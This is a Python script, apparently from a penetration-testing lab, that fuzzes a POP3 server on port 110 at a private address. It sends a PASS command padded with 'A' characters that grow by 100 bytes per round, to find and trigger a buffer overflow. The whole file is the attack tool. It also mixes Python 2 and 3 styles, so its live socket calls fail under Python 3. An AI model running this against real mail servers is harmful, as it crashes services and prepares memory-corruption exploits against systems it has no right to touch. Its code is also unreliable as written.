import socket
import time

server = '192.168.1.112'
port = 110
username = 'ustest'
password = 'test'
buffer = "A"*100
while len(buffer) <= 4000:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Sending buffer of size: {}".format(len(buffer)))
        s.connect((server, port))

        #response = s.recv(1024).decode()
        #s.sendall(f'USER {username}\r\n'.encode())
        #response = s.recv(1024).decode()
        #s.sendall(f'PASS {password}\r\n'.encode())
        #response = s.recv(1024).decode()

        s.recv(1024)

        s.sendall("USER ustest\r\n")
        s.recv(1024)

        s.sendall("PASS " + buffer + "\r\n")
        s.recv(1024)

        s.close()
        print("\n Done!")

        buffer += "A"*100
        time.sleep(0.5)

    except socket.error as e:
        #print(f"Socket error {e}")
        print("Socket error {}".format(e))
    except Exception as e:
        #print(f"Unexpected error: {e}")
        print("Unexpected error {}".format(e))
        break